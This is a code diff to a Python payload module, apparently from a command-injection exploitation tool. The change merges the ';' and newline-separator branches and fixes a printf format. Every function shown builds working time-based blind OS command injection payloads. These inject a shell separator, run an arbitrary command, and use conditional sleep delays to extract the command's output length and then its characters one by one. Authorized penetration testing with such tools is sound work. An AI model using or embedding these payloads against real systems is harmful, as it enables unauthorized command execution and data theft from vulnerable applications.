@@ -44,7 +44,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                 )
 
   else:
-    if separator == ";" :
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
@@ -55,16 +55,6 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "fi"
                  )
 
-    elif separator == "%0a" :
-      payload = (separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
-                 # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi"
-                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -118,18 +108,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                 
                 )
   else:  
-    if separator == ";" :
-      payload = (separator + 
-                 # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "%0a" :
-      #separator = "\n"
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  # Find the length of the output, using readline().
                  "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
@@ -199,7 +178,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                 )
 
   else: 
-    if separator == ";" :
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  "str=\"$(echo $(" + cmd + "))\"" + separator + 
                  #"str1=${%23str}" + separator + 
@@ -209,19 +188,6 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "else sleep " + str(timesec) + separator + 
                  "fi "
                 )
-
-    elif separator == "%0a" :
-      #separator = "\n"
-      payload = (separator + 
-                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
-                 # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
-                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -275,18 +241,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 
                 )
   else: 
-    if separator == ";" :
-      payload = (separator + 
-                 # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "%0a" :
-      #separator = "\n"
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  # Find the length of the output, using readline().
                  "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
@@ -352,30 +307,14 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 )
 
   else: 
-    if separator == ";" :
+    if separator == ";" or separator == "%0a" :
       payload = (separator + 
                 # Grab the execution output.
                 "cmd=\"$(echo $(" + cmd + "))\"" + separator +       
                 # Export char-by-char the execution output.
                 "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                 # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
-                # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " -ne $str ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
-                "fi "
-                )
-
-    elif separator == "%0a" :
-      #separator = "\n"
-      payload = (separator + 
-                # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator +     
-                # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
-                # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
+                "str=$(printf '%d\\n' \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                 "then sleep 0" + separator +
@@ -393,7 +332,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Export char-by-char the execution output.
                 "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                 # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
+                "str=$(printf '%d\\n' \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
                 "sleep " + str(timesec)
@@ -441,17 +380,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 
                 )
   else: 
-    if separator == ";" :
-      payload = (separator + 
-                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
-                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "%0a" :
-      #separator = "\n"
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
@@ -518,17 +447,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                 )
 
   else:
-    if separator == ";" :
-      payload = (separator + 
-                 "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
-                 )
-
-    elif separator == "%0a" :
-      #separator = "\n"
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  "str=\"$(" + cmd + ")\"" + separator + 
                  "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
@@ -585,7 +504,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                 )
   else: 
-    if separator == ";" :
+    if separator == ";" or separator == "%0a":
       payload = (separator + 
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
@@ -594,16 +513,6 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  "fi "
                  )
 
-    elif separator == "%0a" :
-      #separator = "\n"
-      payload = (separator + 
-                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
-                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-      
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
